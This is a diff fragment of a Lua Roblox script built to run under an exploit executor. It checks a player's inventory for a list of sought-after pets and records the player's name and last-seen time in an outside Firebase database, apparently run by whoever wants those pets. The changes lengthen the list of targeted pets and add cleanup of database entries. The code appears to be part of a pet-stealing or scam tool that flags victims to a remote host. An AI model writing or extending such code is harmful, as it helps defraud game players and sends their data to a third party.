@@ -4,7 +4,7 @@ local URL = "https://something-evil-default-rtdb.firebaseio.com/"
 local request = request or syn.request
 
 local LocalPlayer = game:GetService("Players").LocalPlayer
-local DesiredPets = {"raccoon", "dragonfly", "queen bee"}
+local DesiredPets = {"raccoon", "dragonfly", "queen bee", "petal bee", "golden bee", "disco bee", "butterfly", "bear bee", "red fox", "moth"}
 local ListOfPets = {}
 
 local function CheckInventory()
@@ -123,6 +123,10 @@ if data ~= nil then
 				WriteDatabase("Wanteds/"..LocalPlayer.Name, "LastSeen", os.time())
 			end
 		end)()
+	else
+		if (data.Wanteds[LocalPlayer.Name]) then
+			DeleteDatabase("Wanteds", LocalPlayer.Name)
+		end
 	end
 end
 
